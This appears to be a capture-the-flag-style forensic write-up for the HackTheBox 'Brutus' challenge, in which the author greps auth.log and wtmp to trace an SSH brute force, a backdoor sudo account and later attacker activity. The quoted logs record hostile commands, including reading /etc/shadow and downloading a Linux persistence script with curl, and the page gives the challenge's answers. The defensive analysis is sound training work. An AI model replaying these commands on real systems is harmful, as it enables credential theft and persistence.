@@ -1,0 +1,119 @@
+<title>HackTheBox - Brutus (Very easy)</title>
+<header>
+  <div class="header">
+    <div class="titleContainer">
+      <img class="headerIcon" style="border-radius: 0;" src="/write-ups/HackTheBox/Very easy/Brutus/icon.png"/>
+      <p class="mainTitle">HackTheBox - Brutus (Very easy)</p>
+    </div>
+  </div>
+</header>
+<div class="writeUp">
+    <h1 id="table-of-contents">Table of contents</h1>
+    <nav id="tableOfContents" class="tableOfContents">
+    </nav>
+    <h1 id="introduction">Introduction</h1>
+    <blockquote>
+        In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
+    </blockquote>
+    <h1 id="questions">Questions</h1>
+    <h2 id="question-1">Question 1</h2>
+    <p>Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack ?</p>
+    <div class="codeBlock">┌─[cyberretta@parrot]─[~/Documents/HackTheBox/Sherlocks/Brutus]
+└──╼ $cat auth.log | grep Failed
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2327]: Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2331]: Failed password for invalid user admin from 65.2.161.68 port 46436 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2332]: Failed password for invalid user admin from 65.2.161.68 port 46444 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2335]: Failed password for invalid user admin from 65.2.161.68 port 46460 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2337]: Failed password for invalid user admin from 65.2.161.68 port 46498 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2334]: Failed password for invalid user admin from 65.2.161.68 port 46454 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2338]: Failed password for backup from 65.2.161.68 port 46512 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2336]: Failed password for backup from 65.2.161.68 port 46468 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2330]: Failed password for invalid user admin from 65.2.161.68 port 46422 ssh2
+Mar  6 06:31:33 ip-172-31-35-28 sshd[2328]: Failed password for invalid user admin from 65.2.161.68 port 46390 ssh2
+&lt;SNIP&gt;</div>
+    <p>
+        There are many failed login attempts on the SSH service from <code>65.2.161.68</code>, so it must be the IP address of the attacker.
+    </p>
+    <h2 id="question-2">Question 2</h2>
+    <p>The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account ?</p>
+    <div class="codeBlock">┌─[cyberretta@parrot]─[~/Documents/HackTheBox/Sherlocks/Brutus]
+└──╼ $cat auth.log | grep '65.2.161.68' | grep Accepted
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
+Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2</div>
+    <h2 id="question-3">Question 3</h2>
+    <p>Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives ?</p>
+    <p>
+        Since the attacker performed the brute force attack around <code>06:31:3X</code> and found the password at <code>06:31:40</code>, we 
+        can deduce that he connected to the SSH service manually right after the brute force attack. According to the information in 
+        <code>auth.log</code>, the attacker seems to have logged in manually somewhere around <code>2024-03-06 06:32:44</code>. We can read 
+        the <code>wtmp</code> file to confirm this : 
+    </p>
+    <div class="codeBlock">┌─[cyberretta@parrot]─[~/Documents/HackTheBox/Sherlocks/Brutus]
+└──╼ $sudo last -f ./wtmp -F
+cyberjun pts/1        65.2.161.68      Wed Mar  6 07:37:35 2024   gone - no logout
+root     pts/1        65.2.161.68      Wed Mar  6 07:32:45 2024 - Wed Mar  6 07:37:24 2024  (00:04)
+root     pts/0        203.101.190.9    Wed Mar  6 07:19:55 2024   gone - no logout
+reboot   system boot  6.2.0-1018-aws   Wed Mar  6 07:17:15 2024   still running
+root     pts/1        203.101.190.9    Sun Feb 11 11:54:27 2024 - Sun Feb 11 12:08:04 2024  (00:13)
+root     pts/1        203.101.190.9    Sun Feb 11 11:41:11 2024 - Sun Feb 11 11:41:46 2024  (00:00)
+root     pts/0        203.101.190.9    Sun Feb 11 11:33:49 2024 - Sun Feb 11 12:08:04 2024  (00:34)
+root     pts/0        203.101.190.9    Thu Jan 25 12:15:40 2024 - Thu Jan 25 13:34:34 2024  (01:18)
+ubuntu   pts/0        203.101.190.9    Thu Jan 25 12:13:58 2024 - Thu Jan 25 12:15:12 2024  (00:01)
+reboot   system boot  6.2.0-1017-aws   Thu Jan 25 12:12:17 2024 - Sun Feb 11 12:09:18 2024 (16+23:57)
+
+wtmp begins Thu Jan 25 12:12:17 2024</div>
+    <p>As we can see, the attacker logged in as root at <code>06:32:45</code> (the output shows <code>07:32:45</code> because it does not use the same timezone).</p>
+    <h2 id="question-4">Question 4</h2>
+    <p>SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2 ?</p>
+    <p>
+        The SSH session number is assigned right after the successful login attempt. We can check the log entries in <code>auth.log</code> 
+        right after the successful login attempt by using grep :
+    </p>
+    <div class="codeBlock">┌─[✗]─[cyberretta@parrot]─[~/Documents/HackTheBox/Sherlocks/Brutus]
+└──╼ $cat auth.log | grep '06:32:4'
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
+Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.</div>
+    <h2 id="question-5">Question 5</h2>
+    <p>The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account ?</p>
+    <div class="codeBlock">┌─[cyberretta@parrot]─[~/Documents/HackTheBox/Sherlocks/Brutus]
+└──╼ $cat auth.log | grep 'new user'
+Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1</div>
+    <h2 id="question-6">Question 6</h2>
+    <p>What is the MITRE ATT&CK sub-technique ID used for persistence ?</p>
+    <img src="/write-ups/HackTheBox/Very easy/Brutus/image1.png"/>
+    <h2 id="question-7">Question 7</h2>
+    <p>How long did the attacker's first SSH session last based on the previously confirmed authentication time and session ending within the auth.log ? (seconds)</p>
+    <p>We can list sessions closing in the <code>auth.log</code> file :</p>
+    <div class="codeBlock">┌─[cyberretta@parrot]─[~/Documents/HackTheBox/Sherlocks/Brutus]
+└──╼ $cat auth.log | grep 'session closed' | grep root
+Mar  6 06:25:01 ip-172-31-35-28 CRON[2219]: pam_unix(cron:session): session closed for user root
+Mar  6 06:25:01 ip-172-31-35-28 CRON[2218]: pam_unix(cron:session): session closed for user root
+Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: pam_unix(sshd:session): session closed for user root
+Mar  6 06:35:01 ip-172-31-35-28 CRON[2614]: pam_unix(cron:session): session closed for user root
+Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
+Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
+Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root</div>
+    <p>
+        Since the attacker manually logged in to the <code>root</code> user account via SSH at <code>06:32:45</code> (question 3), we can check 
+        the first SSH root session closing after this time which is <code>06:37:24</code>. Thus, the first session opened by the attacker lasted 
+        <code>279</code> seconds  (<code>06:37:24</code> - <code>06:32:45</code>).
+    </p>
+    <h2 id="question-8">Question 8</h2>
+    <p>The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo ?</p>
+    <div class="codeBlock">┌─[cyberretta@parrot]─[~/Documents/HackTheBox/Sherlocks/Brutus]
+└──╼ $cat auth.log | grep 'sudo'
+Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
+Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
+Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
+Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
+Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
+Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root</div>
+    <h1 id="sources">Sources</h1>
+    <ul>
+        <li>Create account persistence technique (MITRE) : <a href="https://attack.mitre.org/techniques/T1136/">https://attack.mitre.org/techniques/T1136/</a></li>
+    </ul>
+</div>
